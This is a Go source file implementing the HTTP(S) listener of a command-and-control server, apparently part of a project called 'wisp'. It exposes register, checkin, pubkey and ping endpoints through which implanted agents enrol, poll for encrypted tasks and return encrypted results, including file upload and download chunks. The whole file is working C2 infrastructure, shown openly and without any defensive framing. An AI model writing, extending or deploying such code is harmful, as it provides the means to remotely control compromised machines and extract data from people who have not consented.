package server

import (
	"context"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"net/http"
	"strings"
	"sync"
	"time"

	"github.com/user/wisp/internal/db"
)

// HTTPListener implements a polling-based HTTP(S) C2 channel.
//
// Endpoints:
//
//	POST /api/v1/register  body: {"payload":"<base64 mixed-encrypted registration>"}
//	                       resp: {"status":"ok","ack":"<base64 AES-encrypted ack>"}
//	POST /api/v1/checkin   body: {"id":"<agentID>","data":"<base64 AES-encrypted results>"}
//	                       resp: {"tasks":"<base64 AES-encrypted pending tasks>"}
type HTTPListener struct {
	mu       sync.Mutex
	id       string
	config   *db.ListenerRow
	server   *Server
	httpSrv  *http.Server
	ln       net.Listener
	running  bool
	stopCh   chan struct{}
}

type httpRegisterRequest struct {
	Payload string `json:"payload"` // base64 of hybrid-encrypted registration
}

type httpRegisterResponse struct {
	Status string `json:"status"`
	ID     string `json:"id,omitempty"`
	Ack    string `json:"ack,omitempty"` // base64 of AES-encrypted ack
}

type httpCheckinRequest struct {
	ID   string `json:"id"`
	Seq  uint64 `json:"seq"` // monotonic counter for replay protection
	Data string `json:"data"` // base64 of AES-encrypted results (may be empty)
}

type httpCheckinResponse struct {
	Tasks string `json:"tasks"` // base64 of AES-encrypted pending tasks
}

// newHTTPListener creates a new HTTP/HTTPS listener bound to the given config.
func newHTTPListener(s *Server, config *db.ListenerRow) *HTTPListener {
	return &HTTPListener{
		id:     config.ID,
		config: config,
		server: s,
		stopCh: make(chan struct{}),
	}
}

// ID returns the listener ID.
func (hl *HTTPListener) ID() string {
	return hl.id
}

// Config returns the listener configuration.
func (hl *HTTPListener) Config() *db.ListenerRow {
	return hl.config
}

// IsRunning reports whether the listener is currently running.
func (hl *HTTPListener) IsRunning() bool {
	hl.mu.Lock()
	defer hl.mu.Unlock()
	return hl.running
}

// Start begins serving the HTTP C2 endpoints.
func (hl *HTTPListener) Start() error {
	hl.mu.Lock()
	defer hl.mu.Unlock()

	if hl.running {
		return fmt.Errorf("listener %s already running", hl.id)
	}

	config := hl.config
	addr := fmt.Sprintf("%s:%d", config.BindHost, config.BindPort)

	mux := http.NewServeMux()
	mux.HandleFunc("/api/v1/register", hl.handleRegister)
	mux.HandleFunc("/api/v1/checkin", hl.handleCheckin)
	// Agents without a compiled-in key fetch the RSA public key here first.
	mux.HandleFunc("/api/v1/pubkey", hl.handlePubKey)
	// Lightweight health check for connectivity validation
	mux.HandleFunc("/api/v1/ping", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusOK)
		w.Write([]byte(`{"status":"ok"}`))
	})

	hl.httpSrv = &http.Server{
		Addr:              addr,
		Handler:           mux,
		ReadHeaderTimeout: 10 * time.Second,
		ReadTimeout:       30 * time.Second,
		WriteTimeout:      30 * time.Second,
	}

	var ln net.Listener
	var err error
	if config.UseTLS {
		ln, err = hl.listenTLS(addr)
	} else {
		ln, err = net.Listen("tcp", addr)
	}
	if err != nil {
		return fmt.Errorf("http listen: %w", err)
	}

	hl.ln = ln
	hl.running = true
	hl.stopCh = make(chan struct{})

	go func() {
		err := hl.httpSrv.Serve(ln)
		select {
		case <-hl.stopCh:
			// expected shutdown
		default:
			if err != nil && err != http.ErrServerClosed {
				log.Printf("[HTTPListener] Serve error: %v", err)
			}
		}
	}()

	log.Printf("[HTTPListener] Listening on %s (TLS: %v)", addr, config.UseTLS)
	return nil
}

// Stop shuts down the HTTP server.
func (hl *HTTPListener) Stop() {
	hl.mu.Lock()
	defer hl.mu.Unlock()

	if !hl.running {
		return
	}
	hl.running = false
	close(hl.stopCh)
	if hl.httpSrv != nil {
		ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
		defer cancel()
		_ = hl.httpSrv.Shutdown(ctx)
	}
	if hl.ln != nil {
		hl.ln.Close()
	}
}

func (hl *HTTPListener) listenTLS(addr string) (net.Listener, error) {
	tlsCert, err := hl.server.loadOrGenerateTLSCert()
	if err != nil {
		return nil, fmt.Errorf("load TLS cert: %w", err)
	}
	config := &tls.Config{
		Certificates: []tls.Certificate{tlsCert},
		MinVersion:   tls.VersionTLS12,
	}
	return tls.Listen("tcp", addr, config)
}

// handlePubKey serves the server's RSA public key so key-less agents can
// bootstrap registration. The PEM is public, so it is returned unencrypted.
func (hl *HTTPListener) handlePubKey(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	resp := map[string]string{"pubkey": string(hl.server.GetRSAPublicKeyPEM())}
	_ = json.NewEncoder(w).Encode(resp)
}

func (hl *HTTPListener) handleRegister(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	if !hl.server.allowConn(remoteAddrIP(r.RemoteAddr)) {
		writeJSONError(w, http.StatusTooManyRequests, "rate limited")
		return
	}
	defer hl.server.releaseConn()

	if r.Method != http.MethodPost {
		writeJSONError(w, http.StatusMethodNotAllowed, "method not allowed")
		return
	}

	// Allow large chunked payloads (download/upload results); 1MB blocks are
	// base64-expanded, so 16MB keeps headroom for a full checkin batch.
	const maxBody = 16 << 20
	var req httpRegisterRequest
	if err := json.NewDecoder(http.MaxBytesReader(w, r.Body, maxBody)).Decode(&req); err != nil {
		writeJSONError(w, http.StatusBadRequest, "invalid request body")
		return
	}

	encPayload, err := base64.StdEncoding.DecodeString(req.Payload)
	if err != nil {
		writeJSONError(w, http.StatusBadRequest, "invalid payload encoding")
		return
	}

	remoteIP := remoteAddrIP(r.RemoteAddr)

	_, encrypted, err := hl.server.processRegistration(encPayload, hl.id, remoteIP)
	if err != nil {
		log.Printf("[HTTPListener] Registration rejected from %s: %v", r.RemoteAddr, err)
		writeJSONError(w, http.StatusUnauthorized, "registration rejected")
		return
	}

	resp := httpRegisterResponse{
		Status: "ok",
		Ack:    base64.StdEncoding.EncodeToString(encrypted),
	}
	json.NewEncoder(w).Encode(resp)
}

func (hl *HTTPListener) handleCheckin(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	if !hl.server.allowConn(remoteAddrIP(r.RemoteAddr)) {
		writeJSONError(w, http.StatusTooManyRequests, "rate limited")
		return
	}
	defer hl.server.releaseConn()

	if r.Method != http.MethodPost {
		writeJSONError(w, http.StatusMethodNotAllowed, "method not allowed")
		return
	}

	const maxBody = 16 << 20
	var req httpCheckinRequest
	if err := json.NewDecoder(http.MaxBytesReader(w, r.Body, maxBody)).Decode(&req); err != nil {
		writeJSONError(w, http.StatusBadRequest, "invalid request body")
		return
	}

	var encryptedBody []byte
	if req.Data != "" {
		var err error
		encryptedBody, err = base64.StdEncoding.DecodeString(req.Data)
		if err != nil {
			writeJSONError(w, http.StatusBadRequest, "invalid data encoding")
			return
		}
	}

	encryptedTasks, err := hl.server.processCheckin(req.ID, req.Seq, encryptedBody)
	if err != nil {
		log.Printf("[HTTPListener] Checkin failed for %s: %v", req.ID, err)
		writeJSONError(w, http.StatusUnauthorized, "checkin rejected")
		return
	}

	resp := httpCheckinResponse{
		Tasks: base64.StdEncoding.EncodeToString(encryptedTasks),
	}
	json.NewEncoder(w).Encode(resp)
}

func remoteAddrIP(remoteAddr string) string {
	host, _, err := net.SplitHostPort(remoteAddr)
	if err != nil {
		return strings.TrimSpace(remoteAddr)
	}
	return host
}

func writeJSONError(w http.ResponseWriter, code int, msg string) {
	w.WriteHeader(code)
	json.NewEncoder(w).Encode(map[string]string{"error": msg})
}
